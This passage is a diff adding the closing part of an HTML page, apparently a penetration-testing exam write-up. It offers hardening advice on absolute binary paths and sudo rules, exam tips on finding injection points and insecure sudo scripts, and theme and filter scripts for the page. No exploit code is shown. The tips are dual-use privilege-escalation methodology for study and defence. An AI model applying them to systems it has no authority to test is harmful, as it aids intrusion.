+   - Enforce absolute binary paths in administrative and backup automation (e.g. use <code>/usr/bin/tar</code> rather than <code>tar</code>).</p>
+</li>
+<li>
+<p><strong>Least Privilege &amp; Sudo Restrictions</strong>:
+   - Avoid granting <code>NOPASSWD</code> sudo rules for scripts that invoke shell utilities without strict environment sanitization (<code>env_reset</code> alone is insufficient if scripts inherit executable search paths).</p>
+</li>
+</ol>
+<hr />
+<h2 id="oscp-exam-takeaways">OSCP Exam Takeaways</h2>
+<ul>
+<li><strong>Inspect API Parameters Closely</strong>: Backend APIs parsing JSON objects frequently present prototype pollution, deserialization, or command injection vectors when interacting with internal system libraries.</li>
+<li><strong>Always Check Sudo Script Internals</strong>: Never run <code>sudo</code> scripts blindly — read the source code to find insecure subprocess calls, relative paths, file inclusions, or writable configuration imports.</li>
+<li><strong>Document Every Stage With Clear Artifacts</strong>: Recording Nmap outputs, raw HTTP requests, reverse shell triggers, and privilege escalation proofs ensures high-scoring documentation during exam reports.</li>
+</ul>
+    </article>
+  </main>
+
+  <script>
+    const toggle = document.getElementById('theme-toggle');
+    toggle.addEventListener('click', () => {
+      const next = document.documentElement.getAttribute('data-theme') === 'light' ? 'dark' : 'light';
+      document.documentElement.setAttribute('data-theme', next);
+      localStorage.setItem('theme', next);
+    });
+
+    const filter = document.getElementById('filter');
+    filter.addEventListener('input', () => {
+      const q = filter.value.toLowerCase();
+      document.querySelectorAll('.sidebar li').forEach(li => {
+        li.style.display = li.textContent.toLowerCase().includes(q) ? '' : 'none';
+      });
+      document.querySelectorAll('.group').forEach(g => {
+        const any = [...g.querySelectorAll('li')].some(li => li.style.display !== 'none');
+        g.style.display = any ? '' : 'none';
+      });
+    });
+  </script>
+</body>
+</html>
